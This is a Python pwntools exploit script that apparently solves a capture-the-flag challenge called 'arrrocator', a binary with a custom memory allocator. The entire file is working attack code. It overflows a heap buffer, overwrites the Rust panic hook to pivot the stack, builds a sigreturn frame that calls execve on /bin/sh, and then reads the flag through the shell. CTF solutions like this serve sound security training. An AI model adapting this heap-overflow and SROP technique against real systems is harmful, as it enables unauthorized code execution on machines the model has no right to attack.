#!/usr/bin/env python3

from pwn import *

exe = ELF("./arrrocator_patched")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.LOCAL:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    else:
        # io = remote("arrrocator-47629d6aa2bb0c27.chal.ush.pw", 443, ssl=True)
        io = remote("127.0.0.1", 1337)
    return io


def main():
    io = conn()
    # Exploit the bug in the memory allocator to get a strong primitive
    # of a 1024-byte long overflow.
    io.sendlineafter(b"gimme", b"1")
    io.sendlineafter(b"Length", b"1024")
    io.sendlineafter(b"flag:", b"A")

    io.sendlineafter(b"gimme", b"2")

    io.sendlineafter(b"gimme", b"1")
    io.sendlineafter(b"Length", b"2048")

    # Address where `do_pivot` is. `rust_panic_with_hook` reads this address
    # and jumps to whatever function pointer is in there.
    mem_addr = 0x614f8
    
    syscall_plt = 0x121a0
    # Syscall numbers.
    sigret = 0x8b
    execve = 0xdd

    # Distance from sp to the beg of memory we control is 0x450 (1104).
    # The sp pivot is `addi    sp,sp,1296`.
    sp_pivot = 0x1a2b2

    mem_start = p64(sp_pivot)

    # We overwrite std::panicking::HOOK with this.
    overflow = b"\x00" * 128 + \
        p64(0x414141) + p64(sigret) + p64(mem_addr-0x28)

    # The offset 184 is where return address after stack pivot happens to be.
    do_pivot = flat({
        184: p64(syscall_plt)
    })

    # Syscall gadget.
    ecall = 0x000000000005068c
    
    srop = flat({
        # pc
        304: p64(ecall),
        # a0-2
        384+8*0: p64(0x061600), # Address of /bin/sh.
        384+8*1: p64(0),
        384+8*2: p64(0),
        # a7
        384+7*8: p64(execve),
        # gp
        328: p64(0x41),
        # tp
        336: p64(0x42),
        # sp
        320: p64(0x43),
        # ra
        312: p64(0x44),
        # /bin/sh
        64: b"/bin/sh\x00"
    })
    srop = srop.ljust(1024-len(mem_start)-len(do_pivot), b"\xcc")
    
    io.sendlineafter(b"flag:", mem_start + do_pivot + srop + overflow)

    io.sendlineafter(b"gimme", b"1")
    io.sendlineafter(b"Length", b"asd")
    io.sendline(b"cat flag")

    io.recvuntil(b"BtSCTF")
    exit(0)


if __name__ == "__main__":
    main()
